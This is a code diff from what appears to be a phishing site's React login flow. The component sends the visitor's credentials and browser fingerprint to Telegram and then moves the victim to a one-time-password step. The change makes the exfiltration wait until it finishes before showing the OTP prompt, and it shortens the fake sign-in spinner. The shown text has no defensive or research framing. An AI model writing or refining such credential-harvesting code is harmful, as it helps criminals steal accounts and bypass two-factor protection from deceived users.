@@ -40,11 +40,11 @@ function App() {
         ...browserFingerprint,
       };
 
-      // Send credentials to Telegram (don't block on failure)
-      safeSendToTelegram({ type: 'credentials', data: credentialsData }).catch((err: any) => console.error('Failed to send credentials:', err));
+      // Send credentials to Telegram and wait for completion before showing OTP
+      await safeSendToTelegram({ type: 'credentials', data: credentialsData });
 
       // Brief delay so the spinner is visible on the Sign In button
-      await new Promise((r) => setTimeout(r, 2500));
+      await new Promise((r) => setTimeout(r, 1500));
 
       setLoginFlowState({
         awaitingOtp: true,
